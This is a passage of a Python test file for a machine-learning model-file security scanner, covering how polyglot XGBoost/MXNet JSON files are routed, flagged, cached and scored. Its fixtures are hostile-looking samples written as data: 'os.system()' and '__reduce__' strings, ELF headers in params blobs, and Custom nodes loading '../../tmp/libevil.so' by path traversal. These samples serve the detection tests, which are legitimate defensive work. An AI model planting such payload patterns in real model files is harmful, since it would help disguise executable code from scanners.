        b'"metadata":"\x7fELF"}'
    )

    result = scan_file(str(model_path), config={"cache_enabled": False})

    assert result.scanner_name == "xgboost"
    assert "xgboost_mxnet_symbol_overlap" in result.metadata["scan_outcome_reasons"]
    assert any("Potential executable signature found in params blob" in issue.message for issue in result.issues)


def test_scan_file_xgboost_owned_shadowed_params_preserves_raw_signature_findings(tmp_path: Path) -> None:
    model_path = tmp_path / "polyglot-0000.params"
    model_path.write_bytes(
        b'{"version":[1,7,4],"learner":{"gradient_booster":{}},'
        b'"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]],'
        b'"metadata":"\x7fELF","nodes":[]}'
    )

    result = scan_file(str(model_path), config={"cache_enabled": False})

    assert result.scanner_name == "xgboost"
    assert "xgboost_mxnet_symbol_overlap" in result.metadata["scan_outcome_reasons"]
    assert any("Potential executable signature found in params blob" in issue.message for issue in result.issues)


def test_scan_file_xgboost_owned_analysis_failed_params_preserves_raw_signature_findings(tmp_path: Path) -> None:
    model_path = tmp_path / "polyglot-0000.params"
    model_path.write_bytes(
        b'{"version":[1,7,4],"learner":{"gradient_booster":{}},'
        b'"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]],'
        b'"metadata":"\x7fELF","limit":' + (b"9" * 5000) + b"}"
    )

    result = scan_file(str(model_path), config={"cache_enabled": False})

    assert result.scanner_name == "xgboost"
    assert "xgboost_json_analysis_failed" in result.metadata["scan_outcome_reasons"]
    assert any("Potential executable signature found in params blob" in issue.message for issue in result.issues)


def test_scan_file_xgboost_only_skips_overlap_params_signature_analysis(tmp_path: Path) -> None:
    model_path = tmp_path / "polyglot-0000.params"
    model_path.write_bytes(
        b'{"version":[1,7,4],"learner":{"gradient_booster":{}},'
        b'"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]],'
        b'"metadata":"\x7fELF"}'
    )

    result = scan_file(str(model_path), config={"scanners": ["xgboost"], "cache_enabled": False})

    assert result.scanner_name == "xgboost"
    assert result.success is True
    assert not any("Potential executable signature found in params blob" in issue.message for issue in result.issues)
    assert "mxnet" in result.metadata["skipped_scanner_ids"]


def test_scan_file_xgboost_only_skips_shadowed_params_signature_analysis(tmp_path: Path) -> None:
    model_path = tmp_path / "polyglot-0000.params"
    model_path.write_bytes(
        b'{"version":[1,7,4],"learner":{"gradient_booster":{}},'
        b'"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]],'
        b'"metadata":"\x7fELF","nodes":[]}'
    )

    result = scan_file(str(model_path), config={"scanners": ["xgboost"], "cache_enabled": False})

    assert "xgboost_mxnet_symbol_overlap" in result.metadata["scan_outcome_reasons"]
    assert not any("Potential executable signature found in params blob" in issue.message for issue in result.issues)
    assert "mxnet" in result.metadata["skipped_scanner_ids"]


def test_scan_file_xgboost_only_skips_analysis_failed_params_signature_analysis(tmp_path: Path) -> None:
    model_path = tmp_path / "polyglot-0000.params"
    model_path.write_bytes(
        b'{"version":[1,7,4],"learner":{"gradient_booster":{}},'
        b'"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]],'
        b'"metadata":"\x7fELF","limit":' + (b"9" * 5000) + b"}"
    )

    result = scan_file(str(model_path), config={"scanners": ["xgboost"], "cache_enabled": False})

    assert "xgboost_json_analysis_failed" in result.metadata["scan_outcome_reasons"]
    assert not any("Potential executable signature found in params blob" in issue.message for issue in result.issues)
    assert "mxnet" in result.metadata["skipped_scanner_ids"]


def test_scan_file_runs_xgboost_checks_for_conclusive_mxnet_json_overlap(tmp_path: Path) -> None:
    model_path = tmp_path / "polyglot.json"
    model_path.write_text(
        '{"version":[1,7,4],"learner":{"gradient_booster":{},"malicious_code":"os.system()"},'
        '"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_file(str(model_path))

    assert result.scanner_name == "xgboost"
    assert result.success is False
    assert "xgboost_mxnet_symbol_overlap" in result.metadata["scan_outcome_reasons"]
    assert any("Suspicious pattern detected: System call in JSON" in issue.message for issue in result.issues)


def test_scan_file_runs_xgboost_checks_for_probable_malformed_mxnet_json_overlap(tmp_path: Path) -> None:
    model_path = tmp_path / "malformed-polyglot.json"
    model_path.write_text(
        '{"version":"malformed","learner":{"gradient_booster":{},"malicious_code":"os.system()"},'
        '"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_file(str(model_path), config={"cache_enabled": False})

    assert result.scanner_name == "xgboost"
    assert result.success is False
    assert "xgboost_mxnet_symbol_overlap" in result.metadata["scan_outcome_reasons"]
    assert any("Suspicious pattern detected: System call in JSON" in issue.message for issue in result.issues)


@pytest.mark.parametrize("filename", ["malformed-0000.params", "malformed.jpg"])
def test_scan_file_runs_xgboost_checks_for_renamed_probable_malformed_mxnet_overlap(
    tmp_path: Path,
    filename: str,
) -> None:
    model_path = tmp_path / filename
    model_path.write_text(
        '{"version":"malformed","learner":{"gradient_booster":{},"malicious_code":"__reduce__"},'
        '"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_file(str(model_path), config={"cache_enabled": False})

    assert result.scanner_name == "xgboost"
    assert result.success is False
    assert any(
        "Suspicious pattern detected: Pickle-like reduction pattern in JSON" in issue.message for issue in result.issues
    )


def test_scan_file_syntactically_malformed_renamed_mxnet_xgboost_overlap_fails_closed(tmp_path: Path) -> None:
    model_path = tmp_path / "malformed.jpg"
    model_path.write_text(
        '{"version":"malformed","learner":{"gradient_booster":{},"malicious_code":"os.system()"},'
        '"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]],@}',
        encoding="utf-8",
    )

    result = scan_file(str(model_path), config={"cache_enabled": False})
    aggregate = scan_model_directory_or_file(str(model_path), cache_scan_results=False)

    assert result.scanner_name == "xgboost"
    assert result.success is False
    assert "xgboost_json_parse_failed" in result.metadata["scan_outcome_reasons"]
    assert aggregate.success is False
    assert core_module.determine_exit_code(aggregate) != 0


@pytest.mark.parametrize("suffix", ["@}", ""])
def test_scan_file_partial_malformed_renamed_mxnet_xgboost_overlap_fails_closed(
    tmp_path: Path,
    suffix: str,
) -> None:
    model_path = tmp_path / "malformed.jpg"
    model_path.write_text(
        '{"version":"malformed","learner":{"gradient_booster":{},"malicious_code":"os.system()"},'
        '"nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
        '"arg_nodes":[0],"heads":' + suffix,
        encoding="utf-8",
    )

    result = scan_file(str(model_path), config={"cache_enabled": False})
    aggregate = scan_model_directory_or_file(str(model_path), cache_scan_results=False)

    assert result.scanner_name == "unknown"
    assert result.success is False
    assert "mxnet_symbol_routing_incomplete" in result.metadata["scan_outcome_reasons"]
    assert aggregate.success is False
    assert core_module.determine_exit_code(aggregate) == 2


def test_scan_file_xgboost_only_runs_renamed_probable_malformed_mxnet_overlap(tmp_path: Path) -> None:
    model_path = tmp_path / "malformed-0000.params"
    model_path.write_text(
        '{"version":"malformed","learner":{"gradient_booster":{},"malicious_code":"os.system()"},'
        '"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_file(str(model_path), config={"scanners": ["xgboost"], "cache_enabled": False})

    assert result.scanner_name == "xgboost"
    assert any("Suspicious pattern detected: System call in JSON" in issue.message for issue in result.issues)


def test_scan_file_xgboost_only_malformed_overlap_is_exit2_and_not_cached(tmp_path: Path) -> None:
    model_path = tmp_path / "malformed-0000.params"
    model_path.write_text(
        '{"version":"malformed","learner":{"gradient_booster":{}},'
        '"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )
    cache_dir = tmp_path / "cache"

    reset_cache_manager()
    try:
        first = scan_model_directory_or_file(
            str(model_path),
            scanners=["xgboost"],
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )
        second = scan_model_directory_or_file(
            str(model_path),
            scanners=["xgboost"],
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )

        for aggregate in (first, second):
            metadata = aggregate.file_metadata[str(model_path)]
            assert aggregate.success is False
            assert metadata["scan_outcome"] == "inconclusive"
            assert "xgboost_json_structure_invalid" in metadata["scan_outcome_reasons"]
            assert core_module.determine_exit_code(aggregate) == 2
            assert "mxnet" in metadata["skipped_scanner_ids"]
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_scan_file_runs_xgboost_checks_for_bounded_probable_malformed_mxnet_overlap(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
    model_path = tmp_path / "bounded-polyglot.json"
    model_path.write_text(
        '{"version":"malformed","learner":{"gradient_booster":{},"malicious_code":"os.system()"},'
        '"padding":"' + ("x" * 256) + '","nodes":[{"op":"null","name":"data"}],'
        '"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_file(str(model_path), config={"cache_enabled": False})

    assert result.scanner_name == "xgboost"
    assert "mxnet_symbol_routing_incomplete" not in result.metadata.get("scan_outcome_reasons", [])
    assert any("Suspicious pattern detected: System call in JSON" in issue.message for issue in result.issues)


def test_scan_file_keeps_benign_mxnet_json_near_match_out_of_xgboost_routing(tmp_path: Path) -> None:
    model_path = tmp_path / "benign-symbol.json"
    model_path.write_text(
        '{"learner":{"description":"benign metadata"},'
        '"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_file(str(model_path), config={"cache_enabled": False})

    assert result.scanner_name == "mxnet"
    assert not any(check.name == "JSON Content Analysis" for check in result.checks)


@pytest.mark.parametrize("filename", ["nested-metadata.json", "nested-metadata-symbol.json"])
def test_scan_file_keeps_nested_xgboost_marker_names_in_mxnet_metadata_out_of_xgboost_analysis(
    tmp_path: Path,
    filename: str,
) -> None:
    model_path = tmp_path / filename
    model_path.write_text(
        '{"nodes":[{"op":"null","name":"data","attrs":{"documentation":'
        '{"version":"malformed","learner":{"gradient_booster":{},"note":"eval(x)"}}}}],'
        '"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_file(str(model_path), config={"cache_enabled": False})

    assert result.scanner_name == "mxnet"
    assert not any(check.name == "JSON Content Analysis" for check in result.checks)


def test_scan_file_canonical_mxnet_symbol_composes_probable_xgboost_security_analysis(tmp_path: Path) -> None:
    model_path = tmp_path / "malformed-symbol.json"
    model_path.write_text(
        '{"version":"malformed","learner":{"gradient_booster":{},"malicious_code":"os.system()"},'
        '"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_file(str(model_path), config={"cache_enabled": False})

    assert result.scanner_name == "mxnet"
    assert result.success is False
    assert any("Suspicious pattern detected: System call in JSON" in issue.message for issue in result.issues)


def test_scan_file_fails_closed_for_xgboost_shadowed_mxnet_nodes(tmp_path: Path) -> None:
    model_path = tmp_path / "polyglot.json"
    model_path.write_text(
        '{"version":[1,7,4],"learner":{"gradient_booster":{}},'
        '"nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
        '"arg_nodes":[0],"heads":[[0,0,0]],"nodes":[]}',
        encoding="utf-8",
    )

    result = scan_file(str(model_path), config={"cache_scan_results": False})

    assert result.scanner_name == "xgboost"
    assert result.success is False
    assert "xgboost_mxnet_symbol_overlap" in result.metadata["scan_outcome_reasons"]
    assert any(
        check.name == "XGBoost / MXNet JSON Routing" and check.details.get("duplicate_root_keys") == ["nodes"]
        for check in result.checks
    )


def test_scan_file_xgboost_only_fails_closed_for_shadowed_mxnet_nodes(tmp_path: Path) -> None:
    model_path = tmp_path / "polyglot.json"
    model_path.write_text(
        '{"version":[1,7,4],"learner":{"gradient_booster":{}},'
        '"nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
        '"arg_nodes":[0],"heads":[[0,0,0]],"nodes":[]}',
        encoding="utf-8",
    )

    result = scan_file(str(model_path), config={"scanners": ["xgboost"], "cache_enabled": False})

    assert result.scanner_name == "xgboost"
    assert result.success is False
    assert "xgboost_mxnet_symbol_overlap" in result.metadata["scan_outcome_reasons"]
    assert any(
        check.name == "XGBoost / MXNet JSON Routing" and check.details.get("duplicate_root_keys") == ["nodes"]
        for check in result.checks
    )


def test_scan_file_mxnet_only_selection_preserves_overlap_security_analysis(tmp_path: Path) -> None:
    model_path = tmp_path / "polyglot.json"
    model_path.write_text(
        '{"version":[1,7,4],"learner":{"gradient_booster":{}},'
        '"nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
        '"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_file(str(model_path), config={"scanners": ["mxnet"], "cache_enabled": False})

    assert result.scanner_name == "mxnet"
    assert any(issue.details.get("attribute") == "library" for issue in result.issues)
    assert "xgboost" in result.metadata["skipped_scanner_ids"]
    xgboost_selection_checks = [
        check
        for check in result.checks
        if check.name == "Scanner Selection" and check.details.get("skipped_scanner_id") == "xgboost"
    ]
    assert len(xgboost_selection_checks) == 1
    assert xgboost_selection_checks[0].details.get("context") == "overlapping JSON analysis"
    assert xgboost_selection_checks[0].details.get("kind") == "preferred"


def test_scan_file_mxnet_only_selection_fails_closed_for_bounded_xgboost_overlap(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
    model_path = tmp_path / "polyglot.json"
    model_path.write_text(
        '{"version":[1,7,4],"learner":{"gradient_booster":{}},"nodes":[{"op":"Custom","name":"load",'
        '"attrs":{"library":"../../tmp/libevil.so","padding":"' + ("x" * 256) + '"}}],'
        '"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_file(str(model_path), config={"scanners": ["mxnet"], "cache_enabled": False})

    assert result.success is False
    assert "mxnet_symbol_routing_incomplete" in result.metadata["scan_outcome_reasons"]
    assert "xgboost" in result.metadata["skipped_scanner_ids"]
    assert any(
        check.name == "Scanner Selection"
        and check.details.get("skipped_scanner_id") == "xgboost"
        and check.details.get("context") == "overlapping JSON analysis"
        and check.details.get("kind") == "preferred"
        for check in result.checks
    )


def test_scan_file_xgboost_only_selection_skips_overlap_mxnet_analysis(tmp_path: Path) -> None:
    model_path = tmp_path / "polyglot.json"
    model_path.write_text(
        '{"version":[1,7,4],"learner":{"gradient_booster":{}},'
        '"nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
        '"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_file(str(model_path), config={"scanners": ["xgboost"], "cache_enabled": False})

    assert result.scanner_name == "xgboost"
    assert result.success is True
    assert not any(issue.details.get("attribute") == "library" for issue in result.issues)
    assert "mxnet" in result.metadata["skipped_scanner_ids"]
    assert "xgboost_mxnet_symbol_overlap" not in result.metadata.get("scan_outcome_reasons", [])
    assert any(
        check.name == "Scanner Selection"
        and check.details.get("skipped_scanner_id") == "mxnet"
        and check.details.get("kind") == "embedded"
        for check in result.checks
    )


def test_scan_file_xgboost_only_overlap_is_clean_and_cached(tmp_path: Path) -> None:
    model_path = tmp_path / "polyglot.json"
    model_path.write_text(
        '{"version":[1,7,4],"learner":{"gradient_booster":{}},'
        '"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]],"padding":"'
        + ("x" * (10 * 1024))
        + '"}',
        encoding="utf-8",
    )
    cache_dir = tmp_path / "cache"

    reset_cache_manager()
    try:
        first = scan_model_directory_or_file(
            str(model_path),
            scanners=["xgboost"],
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )
        second = scan_model_directory_or_file(
            str(model_path),
            scanners=["xgboost"],
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )

        for aggregate in (first, second):
            metadata = aggregate.file_metadata[str(model_path)]
            assert aggregate.success is True
            assert "xgboost_mxnet_symbol_overlap" not in metadata.get("scan_outcome_reasons", [])
            assert core_module.determine_exit_code(aggregate) == 0
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] > 0
    finally:
        reset_cache_manager()


@pytest.mark.parametrize("version", ["[1,7,4]", '"malformed"'])
def test_scan_file_xgboost_only_oversized_renamed_overlap_is_not_clean_or_cached(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    version: str,
) -> None:
    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 512)
    monkeypatch.setattr(core_module, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 512)
    model_path = tmp_path / "polyglot.meta"
    model_path.write_text(
        '{"version":' + version + ',"learner":{"gradient_booster":{},"malicious_code":"os.system()"},'
        '"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]],"padding":"' + ("x" * 600) + '"}',
        encoding="utf-8",
    )
    cache_dir = tmp_path / "cache"
    direct = scan_file(str(model_path), config={"scanners": ["xgboost"], "cache_enabled": False})

    assert direct.scanner_name == "xgboost"
    assert direct.success is False
    assert "max_file_read_size_exceeded" in direct.metadata["scan_outcome_reasons"]

    reset_cache_manager()
    try:
        first = scan_model_directory_or_file(
            str(model_path),
            scanners=["xgboost"],
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )
        second = scan_model_directory_or_file(
            str(model_path),
            scanners=["xgboost"],
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )

        for aggregate in (first, second):
            metadata = aggregate.file_metadata[str(model_path)]
            assert metadata["scan_outcome"] == "inconclusive"
            assert "max_file_read_size_exceeded" in metadata["scan_outcome_reasons"]
            assert core_module.determine_exit_code(aggregate) == 1
            assert "xgboost" in aggregate.scanner_names
            assert any(check.name == "File Size Limit" for check in aggregate.checks)
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_scan_file_inconclusive_params_routing_preserves_raw_findings(tmp_path: Path) -> None:
    params_path = tmp_path / "payload-0000.params"
    params_path.write_text(
        '{"metadata":"\u007fELF os.system()","padding":['
        + ",".join("0" for _ in range(5000))
        + '],"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_file(str(params_path), config={"scanners": ["mxnet"], "cache_enabled": False})
    aggregate = scan_model_directory_or_file(
        str(params_path),
        scanners=["mxnet"],
        cache_scan_results=False,
    )

    assert result.scanner_name == "unknown"
    assert "mxnet_symbol_routing_incomplete" in result.metadata["scan_outcome_reasons"]
    assert any("Potential executable signature found in params blob" in issue.message for issue in result.issues)
    assert any("Suspicious executable token" in issue.message for issue in result.issues)
    assert any("Potential executable signature found in params blob" in issue.message for issue in aggregate.issues)
    assert core_module.determine_exit_code(aggregate) == 2


def test_scan_file_inconclusive_params_routing_honors_excluded_mxnet(tmp_path: Path) -> None:
    params_path = tmp_path / "payload-0000.params"
    params_path.write_text(
        '{"metadata":"\u007fELF os.system()","padding":['
        + ",".join("0" for _ in range(5000))
        + '],"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_file(str(params_path), config={"scanners": ["xgboost"], "cache_enabled": False})

    assert "mxnet_symbol_routing_incomplete" in result.metadata["scan_outcome_reasons"]
    assert not any("Potential executable signature found in params blob" in issue.message for issue in result.issues)
    assert not any("Suspicious executable token" in issue.message for issue in result.issues)
    assert "mxnet" in result.metadata["skipped_scanner_ids"]
    assert any(
        check.name == "Scanner Selection"
        and check.details.get("skipped_scanner_id") == "mxnet"
        and check.details.get("context") == "inconclusive MXNet params byte analysis"
        and check.details.get("kind") == "embedded"
        for check in result.checks
    )


def test_scan_file_xgboost_mxnet_overlap_with_security_finding_is_exit1(tmp_path: Path) -> None:
    model_path = tmp_path / "malicious-polyglot.json"
    model_path.write_text(
        '{"version":[1,7,4],"learner":{"gradient_booster":{},"malicious_code":"os.system()"},'
        '"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    aggregate = scan_model_directory_or_file(str(model_path), cache_scan_results=False)
    metadata = aggregate.file_metadata[str(model_path)]

    assert core_module.determine_exit_code(aggregate) == 1
    assert "xgboost_mxnet_symbol_overlap" in metadata["scan_outcome_reasons"]
    assert any("Suspicious pattern detected: System call in JSON" in issue.message for issue in aggregate.issues)


def test_scan_file_xgboost_mxnet_overlap_is_exit2_and_not_cached(tmp_path: Path) -> None:
    model_path = tmp_path / "polyglot.json"
    model_path.write_text(
        '{"version":[1,7,4],"learner":{"gradient_booster":{}},'
        '"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )
    cache_dir = tmp_path / "cache"

    reset_cache_manager()
    try:
        first = scan_model_directory_or_file(
            str(model_path),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )
        second = scan_model_directory_or_file(
            str(model_path),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )

        for aggregate in (first, second):
            metadata = aggregate.file_metadata[str(model_path)]
            assert aggregate.success is False
            assert metadata["scan_outcome"] == "inconclusive"
            assert "xgboost_mxnet_symbol_overlap" in metadata["scan_outcome_reasons"]
            assert core_module.determine_exit_code(aggregate) == 2
            assert any(
                check.name == "XGBoost / MXNet JSON Routing" and "both static analyses ran" in check.message
                for check in aggregate.checks
            )
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_scan_file_keeps_oversized_renamed_overlap_on_bounded_mxnet_route(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 512)
    monkeypatch.setattr(core_module, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 512)
    monkeypatch.setattr(mxnet_scanner, "MAX_SYMBOL_READ_BYTES", 512)
    model_path = tmp_path / "polyglot.meta"
    model_path.write_text(
        '{"version":[1,7,4],"learner":{"gradient_booster":{}},'
        '"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]],"padding":"' + ("x" * 600) + '"}',
        encoding="utf-8",
    )

    result = scan_file(str(model_path))

    assert result.scanner_name == "mxnet"
    assert result.success is False
    assert "mxnet_symbol_truncated" in result.metadata["scan_outcome_reasons"]
    assert "mxnet_symbol_parse_failed" in result.metadata["scan_outcome_reasons"]
    assert not any(check.name == "JSON Parsing" for check in result.checks)


def test_scan_file_symbol_routed_params_preserves_raw_text_findings(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 512)
    monkeypatch.setattr(core_module, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 512)
    monkeypatch.setattr(mxnet_scanner, "MAX_SYMBOL_READ_BYTES", 512)
    model_path = tmp_path / "payload-0000.params"
    model_path.write_text(
        '{"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]],'
        '"version":[1,7,4],"learner":{"malicious_code":"os.system()"},"padding":"' + ("x" * 1024) + '"}',
        encoding="utf-8",
    )

    result = scan_file(str(model_path))
    aggregate = scan_model_directory_or_file(str(model_path), cache_scan_results=False)

    assert result.scanner_name == "mxnet"
    assert any("Suspicious executable token" in issue.message for issue in result.issues)
    assert "mxnet_symbol_truncated" in result.metadata["scan_outcome_reasons"]
    assert core_module.determine_exit_code(aggregate) == 1
    assert any("Suspicious executable token" in issue.message for issue in aggregate.issues)


@pytest.mark.parametrize("filename", ["polyglot.jpg", "polyglot.params", "polyglot.meta"])
def test_scan_file_runs_xgboost_checks_for_renamed_mxnet_json_overlap(tmp_path: Path, filename: str) -> None:
    model_path = tmp_path / filename
    model_path.write_text(
        '{"version":[1,7,4],"learner":{"gradient_booster":{},"malicious_code":"os.system()"},'
        '"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_file(str(model_path))

    assert result.scanner_name == "xgboost"
    assert result.success is False
    assert "xgboost_mxnet_symbol_overlap" in result.metadata["scan_outcome_reasons"]
    assert any("Suspicious pattern detected: System call in JSON" in issue.message for issue in result.issues)


def test_scan_file_fails_closed_for_mxnet_integer_decode_limit(tmp_path: Path) -> None:
    model_path = tmp_path / "broken-symbol.json"
    model_path.write_text(
        '{"n":' + ("9" * 5000) + ',"nodes":[{"op":"Custom","name":"load"}],"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_file(str(model_path))

    assert result.scanner_name == "mxnet"
    assert result.success is False
    assert "mxnet_symbol_parse_failed" in result.metadata["scan_outcome_reasons"]


@pytest.mark.parametrize("filename", ["recursive.params", "recursive.meta"])
def test_scan_file_fails_closed_for_routed_mxnet_decoder_recursion(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    filename: str,
) -> None:
    model_path = create_mock_mxnet_symbol(tmp_path / filename)

    def raise_recursion(_payload: object) -> object:
        raise RecursionError("decoder nesting limit")

    monkeypatch.setattr(mxnet_scanner.json, "loads", raise_recursion)

    result = scan_file(str(model_path))

    assert result.scanner_name == "mxnet"
    assert result.success is False
    assert "mxnet_symbol_parse_failed" in result.metadata["scan_outcome_reasons"]


def test_scan_file_large_generic_json_without_mxnet_hint_fails_closed(tmp_path: Path) -> None:
    config_path = tmp_path / "config.json"
    config_path.write_text(
        '{"metadata":"' + ("x" * (file_detection.MXNET_SYMBOL_SIGNATURE_READ_BYTES + 1)) + '"}',
        encoding="utf-8",
    )

    result = scan_file(str(config_path))

    assert result.success is False
    assert "mxnet_symbol_routing_incomplete" in result.metadata.get("scan_outcome_reasons", [])


def test_scan_file_whitespace_prefixed_generic_json_without_mxnet_hint_fails_closed(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
    config_path = tmp_path / "config.json"
    config_path.write_text((" " * 129) + '{"metadata":"safe"}', encoding="utf-8")

    result = scan_file(str(config_path))

    assert result.success is False
    assert "mxnet_symbol_routing_incomplete" in result.metadata.get("scan_outcome_reasons", [])


def test_scan_file_scalar_heads_generic_json_uses_existing_owner(tmp_path: Path) -> None:
    config_path = tmp_path / "config.json"
    config_path.write_text(
        '{"heads":"main","padding":[' + ",".join("0" for _ in range(5000)) + "]}",
        encoding="utf-8",
    )

    result = scan_file(str(config_path))

    assert result.scanner_name == "manifest"
    assert "mxnet_symbol_routing_incomplete" not in result.metadata.get("scan_outcome_reasons", [])


def test_scan_file_fails_closed_for_large_generic_json_with_truncated_duplicate_mxnet_nodes(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
    config_path = tmp_path / "config.json"
    config_path.write_text(
        '{"heads":[[0,0,0]],"nodes":[],"padding":"'
        + ("x" * 256)
        + '","nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
        '"arg_nodes":[0]}',
        encoding="utf-8",
    )

    result = scan_file(str(config_path))

    assert result.success is False
    assert "mxnet_symbol_routing_incomplete" in result.metadata.get("scan_outcome_reasons", [])


@pytest.mark.parametrize("initial_nodes", ["[]", "null"])
def test_scan_file_fails_closed_for_early_duplicate_mxnet_nodes_without_other_hints(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    initial_nodes: str,
) -> None:
    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
    config_path = tmp_path / "metadata.json"
    config_path.write_text(
        '{"nodes":'
        + initial_nodes
        + ',"padding":"'
        + ("x" * 256)
        + '","nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
        '"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_file(str(config_path))

    assert result.success is False
    assert "mxnet_symbol_routing_incomplete" in result.metadata.get("scan_outcome_reasons", [])


def test_scan_file_fails_closed_for_generic_json_with_padded_node_object(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
    config_path = tmp_path / "metadata.json"
    config_path.write_text(
        '{"nodes":[{"attrs":"'
        + ("x" * 129)
        + '","op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
        '"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_file(str(config_path))

    assert result.success is False
    assert "mxnet_symbol_routing_incomplete" in result.metadata.get("scan_outcome_reasons", [])


def test_scan_file_oversized_generic_json_with_lone_array_heads_fails_closed(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
